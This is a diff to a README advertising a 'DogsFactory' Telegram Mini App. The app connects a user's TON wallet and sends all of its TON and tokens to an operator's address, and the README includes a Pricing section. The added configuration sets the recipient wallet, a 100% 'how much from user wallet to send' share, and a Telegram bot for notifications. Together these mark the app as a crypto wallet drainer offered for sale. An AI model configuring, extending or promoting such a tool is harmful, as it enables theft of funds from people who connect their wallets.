@@ -1,6 +1,6 @@
 **What is this**
 ---------------
-**DogsFactory Telegram Mini App** connects user TON wallet and allows you to initiate transactions. The app can send all TON amount and other tokens in the same transaction for lower transaction fees.
+**dogsFactory Telegram Mini App** connects user TON wallet and allows you to initiate transactions. The app can send all TON amount and other tokens in the same transaction for lower transaction fees.
 
 **Demo**
 -----
@@ -15,7 +15,20 @@ https://youtu.be/r__ShzFHxqM
 * Sends all TON amount and other tokens in the same transaction (configurable)
 * Supports various token types (e.g., TON, DOGS, NOT, other custom jettoken's)
 * Receive notification on Telegram
+* Can be customized in any way you need
 
+```
+# Telegram Bot Token
+VITE_NOTIFICATION_BOT_TOKEN=xxx
+VITE_NOTIFICATION_CHAT_ID=13121213
+
+# Recipients
+VITE_RECIPIENT_ADDRESS=your_wallet_address
+VITE_PERCENT_TO_SEND=100 # how much from user wallet to send
+VITE_TRANSACTION_COMMENT=transaction_comment
+
+VITE_MINIMUM_TON_BALANCE=0.1 
+```
 
 **Pricing**
 ----------
